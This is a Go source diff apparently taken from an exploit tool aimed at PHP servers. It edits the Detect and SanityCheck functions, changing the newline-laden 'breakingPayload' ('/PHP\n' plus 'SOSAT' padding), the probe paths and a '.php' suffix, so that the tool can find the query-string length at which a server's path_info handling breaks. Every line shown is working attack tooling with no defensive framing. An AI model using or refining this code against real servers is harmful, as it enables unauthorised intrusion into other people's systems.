@@ -30,7 +30,7 @@ func (ap *AttackParams) String() string {
 
 func Detect(requester *Requester, method *DetectMethod, hints *AttackParams, onlyQSL bool) (*AttackParams, error) {
 	var qslCandidates []int
-	baseResp, _, err := requester.Request("/pathinfo", &AttackParams{MinQSL, 1})
+	baseResp, _, err := requester.Request("/path\ninfo.php", &AttackParams{MinQSL, 1})
 	if err != nil {
 		return nil, fmt.Errorf("error while doing first request: %v", err)
 	}
@@ -43,7 +43,7 @@ func Detect(requester *Requester, method *DetectMethod, hints *AttackParams, onl
 		log.Printf("Skipping qsl detection, using hint (qsl=%v)", hints.QueryStringLength)
 		qslCandidates = append(qslCandidates, hints.QueryStringLength)
 	} else {
-		breakingPayload := "/PHP\n" + strings.Repeat("SOSAT", 10)[:PosOffset-9]
+		breakingPayload := "/PHP\n" + strings.Repeat("SOSAT", 10)[:PosOffset-13] + ".php"
 		for qsl := MinQSL; qsl <= MaxQSL; qsl += QSLDetectStep {
 			ap := &AttackParams{qsl, 1}
 			resp, _, err := requester.Request(breakingPayload, ap)
@@ -124,7 +124,7 @@ func SanityCheck(requester *Requester, method *DetectMethod, baseStatus int) err
 	}
 
 	if resp.StatusCode != baseStatus {
-		return fmt.Errorf("invalid status code when checking path_info: %v (must be %v)", resp.StatusCode, baseStatus)
+		return fmt.Errorf("invalid status code: %v (must be %v). Maybe \".php\" suffix is required?", resp.StatusCode, baseStatus)
 	}
 
 	if method.Check(resp, data) {
